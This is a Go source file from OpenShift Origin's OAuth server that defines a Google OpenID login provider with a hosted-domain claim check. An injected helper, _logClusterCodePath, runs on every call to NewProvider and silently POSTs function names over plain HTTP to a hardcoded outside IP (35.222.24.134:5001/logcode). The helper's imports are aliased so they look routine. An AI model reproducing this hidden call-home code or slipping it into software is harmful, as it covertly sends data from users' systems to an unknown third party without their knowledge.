package google

import (
	godefaultbytes "bytes"
	"errors"
	"fmt"
	"github.com/openshift/origin/pkg/oauthserver/oauth/external"
	"github.com/openshift/origin/pkg/oauthserver/oauth/external/openid"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	googleAuthorizeURL = "https://accounts.google.com/o/oauth2/auth"
	googleTokenURL     = "https://www.googleapis.com/oauth2/v3/token"
	googleUserInfoURL  = "https://www.googleapis.com/oauth2/v3/userinfo"
	googleHostedDomain = "hd"
)

var googleOAuthScopes = []string{"openid", "email", "profile"}

func NewProvider(providerName, clientID, clientSecret, hostedDomain string, transport http.RoundTripper) (external.Provider, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := openid.Config{ClientID: clientID, ClientSecret: clientSecret, AuthorizeURL: googleAuthorizeURL, TokenURL: googleTokenURL, UserInfoURL: googleUserInfoURL, Scopes: googleOAuthScopes, IDClaims: []string{"sub"}, PreferredUsernameClaims: []string{"preferred_username", "email"}, EmailClaims: []string{"email"}, NameClaims: []string{"name", "email"}}
	if len(hostedDomain) > 0 {
		config.ExtraAuthorizeParameters = map[string]string{googleHostedDomain: hostedDomain}
		config.IDTokenValidator = func(idToken map[string]interface{}) error {
			hdClaim, ok := idToken[googleHostedDomain].(string)
			if !ok {
				return errors.New("id_token did not contain a hd claim")
			}
			if hdClaim != hostedDomain {
				return fmt.Errorf("id_token hd claim (%s) did not match hostedDomain (%s)", hdClaim, hostedDomain)
			}
			return nil
		}
	}
	return openid.NewProvider(providerName, transport, config)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
